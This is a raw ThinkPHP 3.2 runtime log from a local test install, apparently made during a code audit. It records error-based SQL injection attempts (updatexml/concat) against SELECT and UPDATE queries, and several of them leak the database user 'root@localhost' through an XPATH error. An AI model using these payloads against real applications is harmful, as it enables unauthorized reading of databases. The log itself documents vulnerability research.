[ 2019-04-05T10:04:36+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000005s ]
INFO: [ app_init ] --END-- [ RunTime:0.000029s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000452s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000476s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0865s ]
NOTIC: [8] Undefined index: name D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Shop\Home\Controller\IndexController.class.php 第 8 行.
SQL: SELECT `name`,`password` FROM `test` WHERE `name` = null LIMIT 1   [ RunTime:0.0042s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.001320s ]
INFO: [ app_end ] --END-- [ RunTime:0.001381s ]

[ 2019-04-05T10:06:11+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000006s ]
INFO: [ app_init ] --END-- [ RunTime:0.000031s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000526s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000558s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0300s ]
ERR: 表达式错误:1

[ 2019-04-05T10:06:34+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000005s ]
INFO: [ app_init ] --END-- [ RunTime:0.000029s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000504s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000533s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0316s ]
ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'LIMIT 1' at line 1
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` ='aaa' and updatexml(1,concat(0x7e,(select user()),0x7e),1 LIMIT 1  
ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'LIMIT 1' at line 1
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` ='aaa' and updatexml(1,concat(0x7e,(select user()),0x7e),1 LIMIT 1  

[ 2019-04-05T10:07:10+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000006s ]
INFO: [ app_init ] --END-- [ RunTime:0.000032s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.001025s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001130s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0316s ]
ERR: 1105:XPATH syntax error: '~root@localhost~'
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` ='aaa' and updatexml(1,concat(0x7e,(select user()),0x7e),1) LIMIT 1  
ERR: 1105:XPATH syntax error: '~root@localhost~'
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` ='aaa' and updatexml(1,concat(0x7e,(select user()),0x7e),1) LIMIT 1  

[ 2019-04-05T10:07:16+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000006s ]
INFO: [ app_init ] --END-- [ RunTime:0.000032s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000476s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000504s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0089s ]
ERR: 1105:XPATH syntax error: '~root@localhost~'
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` ='aaa' and updatexml(1,concat(0x7e,(select user()),0x7e),1) LIMIT 1  
ERR: 1105:XPATH syntax error: '~root@localhost~'
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` ='aaa' and updatexml(1,concat(0x7e,(select user()),0x7e),1) LIMIT 1  

[ 2019-04-05T10:07:23+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000005s ]
INFO: [ app_init ] --END-- [ RunTime:0.000029s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000459s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000483s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0287s ]
ERR: 1105:XPATH syntax error: '~root@localhost~'
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` ='aaa' and updatexml(1,concat(0x7e,(select user()),0x7e),1) LIMIT 1  
ERR: 1105:XPATH syntax error: '~root@localhost~'
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` ='aaa' and updatexml(1,concat(0x7e,(select user()),0x7e),1) LIMIT 1  

[ 2019-04-05T10:09:33+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000059s ]
INFO: [ app_init ] --END-- [ RunTime:0.000362s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.001078s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001362s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0293s ]

[ 2019-04-05T10:09:37+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000038s ]
INFO: [ app_init ] --END-- [ RunTime:0.000331s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000578s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000765s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0294s ]
ERR: 1105:XPATH syntax error: '~root@localhost~'
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` ='aaa' and updatexml(1,concat(0x7e,(select user()),0x7e),1) LIMIT 1  
ERR: 1105:XPATH syntax error: '~root@localhost~'
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` ='aaa' and updatexml(1,concat(0x7e,(select user()),0x7e),1) LIMIT 1  
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php:170) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 230 行.
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php:170) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 231 行.

[ 2019-04-05T10:11:30+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000038s ]
INFO: [ app_init ] --END-- [ RunTime:0.000207s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000661s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000833s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0187s ]

[ 2019-04-05T10:13:50+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000037s ]
INFO: [ app_init ] --END-- [ RunTime:0.000204s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000700s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000932s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0347s ]

[ 2019-04-05T10:14:16+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000038s ]
INFO: [ app_init ] --END-- [ RunTime:0.000218s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000618s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000796s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0306s ]

[ 2019-04-05T10:30:28+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000120s ]
INFO: [ app_init ] --END-- [ RunTime:0.000675s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.002166s ]
INFO: [ app_begin ] --END-- [ RunTime:0.002736s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0214s ]
SQL: SELECT `name`,`password` FROM `test` WHERE `name` = '1' LIMIT 1   [ RunTime:0.0006s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.001584s ]
INFO: [ app_end ] --END-- [ RunTime:0.002002s ]

[ 2019-04-05T10:35:37+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000047s ]
INFO: [ app_init ] --END-- [ RunTime:0.000239s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000900s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001204s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0131s ]

[ 2019-04-05T10:36:54+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000089s ]
INFO: [ app_init ] --END-- [ RunTime:0.000522s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.001246s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001661s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0328s ]
ERR: 1305:FUNCTION thinkphp.uopdatexml does not exist
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` ='aaa' and uopdatexml(1,cancat(0x7e,(select user()),0x7e),1) LIMIT 1  
ERR: 1305:FUNCTION thinkphp.uopdatexml does not exist
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` ='aaa' and uopdatexml(1,cancat(0x7e,(select user()),0x7e),1) LIMIT 1  
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php:170) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 230 行.
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php:170) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 231 行.

[ 2019-04-05T10:37:04+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000052s ]
INFO: [ app_init ] --END-- [ RunTime:0.000296s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000790s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001043s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0295s ]
ERR: 1305:FUNCTION thinkphp.cancat does not exist
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` ='aaa' and updatexml(1,cancat(0x7e,(select user()),0x7e),1) LIMIT 1  
ERR: 1305:FUNCTION thinkphp.cancat does not exist
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` ='aaa' and updatexml(1,cancat(0x7e,(select user()),0x7e),1) LIMIT 1  
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php:170) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 230 行.
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php:170) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 231 行.

[ 2019-04-05T10:38:02+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000035s ]
INFO: [ app_init ] --END-- [ RunTime:0.000201s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000558s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000721s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0309s ]
ERR: 1105:XPATH syntax error: '~root@localhost~'
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` ='aaa' and updatexml(1,concat(0x7e,(select user()),0x7e),1) LIMIT 1  
ERR: 1105:XPATH syntax error: '~root@localhost~'
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` ='aaa' and updatexml(1,concat(0x7e,(select user()),0x7e),1) LIMIT 1  
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php:170) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 230 行.
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php:170) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 231 行.

[ 2019-04-05T10:47:15+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000040s ]
INFO: [ app_init ] --END-- [ RunTime:0.000223s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000611s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000785s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0284s ]

[ 2019-04-05T10:49:21+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000039s ]
INFO: [ app_init ] --END-- [ RunTime:0.000207s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000563s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000731s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0311s ]

[ 2019-04-05T10:49:35+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000061s ]
INFO: [ app_init ] --END-- [ RunTime:0.000373s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.001001s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001299s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0222s ]
NOTIC: [8] Undefined index: name D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Shop\Home\Controller\IndexController.class.php 第 8 行.
SQL: SELECT `name`,`password` FROM `test` WHERE `name` = null LIMIT 1   [ RunTime:0.0012s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.002117s ]
INFO: [ app_end ] --END-- [ RunTime:0.002541s ]

[ 2019-04-05T10:49:51+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000038s ]
INFO: [ app_init ] --END-- [ RunTime:0.000231s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000576s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000736s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0312s ]
SQL: SELECT `name`,`password` FROM `test` WHERE `name` = '123' LIMIT 1   [ RunTime:0.0009s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.002137s ]
INFO: [ app_end ] --END-- [ RunTime:0.002766s ]

[ 2019-04-05T10:50:43+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000037s ]
INFO: [ app_init ] --END-- [ RunTime:0.000206s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000559s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000728s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0300s ]

[ 2019-04-05T10:53:46+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000041s ]
INFO: [ app_init ] --END-- [ RunTime:0.000229s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000583s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000760s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0251s ]

[ 2019-04-05T11:01:35+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000038s ]
INFO: [ app_init ] --END-- [ RunTime:0.000222s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000594s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000770s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0344s ]

[ 2019-04-05T11:10:44+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000042s ]
INFO: [ app_init ] --END-- [ RunTime:0.000237s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000714s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000904s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0286s ]
ERR: 1054:Unknown column 'bind' in 'where clause'
 [ SQL语句 ] : UPDATE `test` SET `name`='test',`password`='123' WHERE (  bind ) AND (   ‘aaa’ and updatexml(1,concat(0x7e,(select user()),0x7e),1) )
ERR: 1054:Unknown column 'bind' in 'where clause'
 [ SQL语句 ] : UPDATE `test` SET `name`='test',`password`='123' WHERE (  bind ) AND (   ‘aaa’ and updatexml(1,concat(0x7e,(select user()),0x7e),1) )
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php:223) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 230 行.
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php:223) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 231 行.

[ 2019-04-05T11:11:18+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000038s ]
INFO: [ app_init ] --END-- [ RunTime:0.000210s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000599s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000776s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0284s ]
ERR: 1054:Unknown column 'bind' in 'where clause'
 [ SQL语句 ] : UPDATE `test` SET `name`='test',`password`='123' WHERE (  bind ) AND (   ‘aaa’ and updatexml(1,concat(0x7e,(select user()),0x7e),1) )
ERR: 1054:Unknown column 'bind' in 'where clause'
 [ SQL语句 ] : UPDATE `test` SET `name`='test',`password`='123' WHERE (  bind ) AND (   ‘aaa’ and updatexml(1,concat(0x7e,(select user()),0x7e),1) )
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php:223) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 230 行.
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php:223) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 231 行.

[ 2019-04-05T11:12:31+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000040s ]
INFO: [ app_init ] --END-- [ RunTime:0.000214s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000655s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000852s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0345s ]
ERR: 1054:Unknown column 'bind' in 'where clause'
 [ SQL语句 ] : UPDATE `test` SET `name`='test',`password`='123' WHERE (  bind ) AND (   ‘aaa’ and updatexml(1,concat(0x7e,(select user()),0x7e),1) )

[ 2019-04-05T11:13:09+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000037s ]
INFO: [ app_init ] --END-- [ RunTime:0.000201s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000550s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000717s ]

[ 2019-04-05T11:13:44+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000037s ]
INFO: [ app_init ] --END-- [ RunTime:0.000202s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000553s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000720s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0141s ]

[ 2019-04-05T11:16:39+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000036s ]
INFO: [ app_init ] --END-- [ RunTime:0.000201s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000584s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000752s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0132s ]
ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ': ‘aaa’ and updatexml(1,concat(0x7e,(select user()),0x7e),1)' at line 1
 [ SQL语句 ] : UPDATE `test` SET `name`='test',`password`='123' WHERE `name` = : ‘aaa’ and updatexml(1,concat(0x7e,(select user()),0x7e),1)

[ 2019-04-05T11:16:53+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000032s ]
INFO: [ app_init ] --END-- [ RunTime:0.000204s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000976s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001357s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0112s ]
ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ': 0 and updatexml(1,concat(0x7e,(select user()),0x7e),1)' at line 1
 [ SQL语句 ] : UPDATE `test` SET `name`='test',`password`='123' WHERE `name` = : 0 and updatexml(1,concat(0x7e,(select user()),0x7e),1)
ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ': 0 and updatexml(1,concat(0x7e,(select user()),0x7e),1)' at line 1
 [ SQL语句 ] : UPDATE `test` SET `name`='test',`password`='123' WHERE `name` = : 0 and updatexml(1,concat(0x7e,(select user()),0x7e),1)
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php:223) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 230 行.
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php:223) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 231 行.

[ 2019-04-05T11:17:42+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000036s ]
INFO: [ app_init ] --END-- [ RunTime:0.000198s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.001637s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001979s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0147s ]

[ 2019-04-05T11:17:48+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000031s ]
INFO: [ app_init ] --END-- [ RunTime:0.000185s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.001352s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001791s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0336s ]
ERR: 1105:XPATH syntax error: '~root@localhost~'
 [ SQL语句 ] : UPDATE `test` SET `name`='test',`password`='123' WHERE `name` = 'test' and updatexml(1,concat(0x7e,(select user()),0x7e),1)
ERR: 1105:XPATH syntax error: '~root@localhost~'
 [ SQL语句 ] : UPDATE `test` SET `name`='test',`password`='123' WHERE `name` = 'test' and updatexml(1,concat(0x7e,(select user()),0x7e),1)
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php:223) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 230 行.
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php:223) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 231 行.

[ 2019-04-05T11:20:23+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000047s ]
INFO: [ app_init ] --END-- [ RunTime:0.000283s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000639s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000837s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0262s ]

[ 2019-04-05T11:22:10+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000040s ]
INFO: [ app_init ] --END-- [ RunTime:0.000230s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.001066s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001288s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0177s ]

